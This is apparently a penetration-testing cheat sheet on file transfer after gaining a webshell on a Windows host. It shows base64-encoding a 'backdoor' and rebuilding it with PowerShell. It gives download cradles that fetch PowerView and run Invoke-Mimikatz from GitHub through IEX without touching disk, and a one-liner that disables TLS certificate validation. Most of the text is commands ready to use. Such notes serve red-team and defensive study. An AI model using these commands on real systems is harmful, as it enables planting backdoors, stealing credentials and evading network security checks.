
## 1) PowerShell Base64 Encode & Decode
if you have access to terminal using a webshell you can 


- base64 a file that you want to transfer
```bash
$ cat backdoor| base64 -w 0 ; echo
YmFkIHRoaW5ncyBoYXBwZW4gaGVyZQo=


$ md5sum shell
2eebc05b20651f70efb2d195bbdaf2c2  shell
```


- paste it in powershell
```powershell
PS C:\user> [IO.File]::WriteAllBytes("C:\Users\public\Desktop\testing\backdoor",[Convert]::FromBase64String("YmFkIHRoaW5ncyBoYXBwZW4gaGVyZQo="))


PS C:\user> Get-FileHash .\backdoor -Algorithm MD5

Algorithm       Hash                                                                   Path                                 
---------       ----                                                                   ----                                 
MD5             2EEBC05B20651F70EFB2D195BBDAF2C2  
```



**Note:** While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

## 2) PowerShell HTTP download

### 1) PowerShell DownloadFile Method
```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

### 2) PowerShell DownloadString - Fileless Method
- `IEX` It is a cmdlet used to evaluate or execute a string as a PowerShell command.
```powershell
PS C:\user> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

PS C:\user> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
### 3) PowerShell Invoke-WebRequest
```powershell
PS C:\user> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

PS C:\user> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -UseBasicParsing | IEX
```

if the certificate is not trusted. We can bypass that error with the following command:
```powershell
PS C:\user> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
